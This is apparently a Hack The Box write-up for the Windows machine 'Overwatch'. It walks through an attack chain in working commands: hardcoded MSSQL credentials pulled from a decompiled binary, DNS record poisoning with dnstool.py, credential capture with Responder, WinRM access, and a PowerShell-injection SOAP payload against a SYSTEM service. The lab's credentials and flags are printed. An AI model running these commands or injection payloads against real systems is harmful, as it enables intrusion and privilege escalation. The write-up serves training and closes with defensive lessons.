# Overwatch - HTB Machine Writeup

## Box Info
- **OS**: Windows Server 2022
- **IP**: 10.129.72.205
- **Difficulty**: Hard
- **Domain**: overwatch.htb (DC: S200401)

---

## TL;DR

MSSQL creds from a .NET monitoring service binary → DNS poisoning a linked server name → capture cleartext SQL creds via Responder → WinRM as `sqlmgmt` → exploit a PowerShell injection in a WCF service running as SYSTEM.

---

## Recon

Standard nmap reveals a Windows Domain Controller with all the usual AD ports plus a non-standard **MSSQL on port 6520** and **WinRM on 5985**.

The SMB `software$` share is accessible as guest and contains a `Monitoring` folder with a .NET binary called `overwatch.exe` along with its dependencies (EntityFramework, SQLite, PowerShell automation DLLs).

---

## Step 1: Decompiling the .NET Binary

We grab `overwatch.exe` from the share and decompile it with `ilspycmd`. This reveals a monitoring service with some juicy stuff:

**Hardcoded connection string in the constructor:**
```csharp
private readonly string connectionString = "Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;";
```

**A WCF service on port 8000** with three operations:
- `StartMonitoring()` - watches for process starts and session switches
- `StopMonitoring()` - stops watching
- `KillProcess(string processName)` - this one is spicy

**The KillProcess method has a blatant PowerShell injection:**
```csharp
public string KillProcess(string processName)
{
    string text = "Stop-Process -Name " + processName + " -Force";
    // Creates a PowerShell runspace and runs the above command...
}
```

No sanitization. Whatever you pass as `processName` gets concatenated directly into a PowerShell command. Classic.

There's also SQL injection in `LogEvent` and `CheckEdgeHistory` (reads Edge browser URLs every 30s and inserts them unsanitized into MSSQL), but those end up being red herrings for the main attack path.

---

## Step 2: MSSQL Enumeration

Using the creds from the binary, we connect to MSSQL:

```bash
impacket-mssqlclient 'overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@10.129.72.205' -windows-auth -port 6520
```

Key findings:
- We're **dbo** on the `overwatch` database (has an `Eventlog` table)
- Not sysadmin, CLR disabled, xp_cmdshell disabled, OLE Automation disabled - basically everything locked down
- Port 8000 (the WCF service) is **firewalled** from external access
- But there's a **linked server called SQL07** that can't connect (server not found)

The linked server `SQL07` is the key. It exists in the config but the hostname doesn't resolve to anything. Hmm...

---

## Step 3: DNS Poisoning the Linked Server

Since we have valid domain credentials, we can add DNS records to Active Directory. The linked server tries to connect to `SQL07` which gets resolved as `SQL07.overwatch.htb` by DNS suffix. If we register that name pointing to our machine...

```bash
python3 dnstool.py -u 'overwatch.htb\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
    -r 'SQL07.overwatch.htb' -a add -d 10.10.17.4 10.129.72.205
```

Success! Now `SQL07` resolves to our attacker IP.

---

## Step 4: Capturing Credentials with Responder

With Responder running on our machine, we trigger the linked server connection:

```sql
SELECT * FROM OPENQUERY([SQL07], 'SELECT 1')
```

The MSSQL server tries to connect to "SQL07" (now our IP) and Responder captures the authentication. Since the linked server uses SQL authentication (not Windows/NTLM), we get **cleartext credentials**:

```
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

The linked server was configured to authenticate to SQL07 as `sqlmgmt` with a SQL login. Responder's built-in MSSQL handler just accepts any auth and logs it.

---

## Step 5: User Flag via WinRM

Quick LDAP check shows `sqlmgmt` is a member of **Remote Management Users**. That means WinRM:

```bash
evil-winrm -i 10.129.72.205 -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'
```

```
type C:\Users\sqlmgmt\Desktop\user.txt
5f88974cedd6e47df1ef18ad2ea11d39
```

---

## Step 6: Privilege Escalation - PowerShell Injection as SYSTEM

Now we're on the box. Remember that WCF service on port 8000 with the PowerShell injection in `KillProcess`? It was firewalled from outside, but from inside we can hit `localhost:8000`.

The service is installed via **NSSM** (Non-Sucking Service Manager) and runs as **NT AUTHORITY\SYSTEM**.

We craft a SOAP request to call `KillProcess` with a payload that breaks out of the `Stop-Process` command:

```powershell
$body = '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>foo; whoami #</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>'

$headers = @{
    "SOAPAction" = '"http://tempuri.org/IMonitoringService/KillProcess"'
    "Content-Type" = "text/xml; charset=utf-8"
}

Invoke-WebRequest -Uri "http://localhost:8000/MonitorService" -Method POST -Body $body -Headers $headers
```

The service constructs: `Stop-Process -Name foo; whoami # -Force`

PowerShell sees the `;` as a command separator, executes `whoami`, and the `#` comments out the trailing `-Force`. The response comes back:

```
nt authority\system
```

Now just swap `whoami` for `Get-Content C:\Users\Administrator\Desktop\root.txt`:

```xml
<processName>foo; Get-Content C:\Users\Administrator\Desktop\root.txt #</processName>
```

```
1467d96db7ebee84d5df6eb8a49e2b20
```

---

## Flags

| Flag | Hash |
|------|------|
| User | `5f88974cedd6e47df1ef18ad2ea11d39` |
| Root | `1467d96db7ebee84d5df6eb8a49e2b20` |

---

## Key Takeaways

1. **Don't hardcode credentials in binaries** - .NET assemblies are trivially decompilable
2. **Linked servers with SQL auth are dangerous** - credentials are sent in cleartext if an attacker controls the destination
3. **Authenticated domain users can often add DNS records** - this is by-design in AD but can be abused
4. **String concatenation into shell commands = game over** - always sanitize inputs, especially in code running as SYSTEM
5. **Firewall rules aren't defense-in-depth** - the WCF service was only blocked externally; once inside, it was fully exploitable
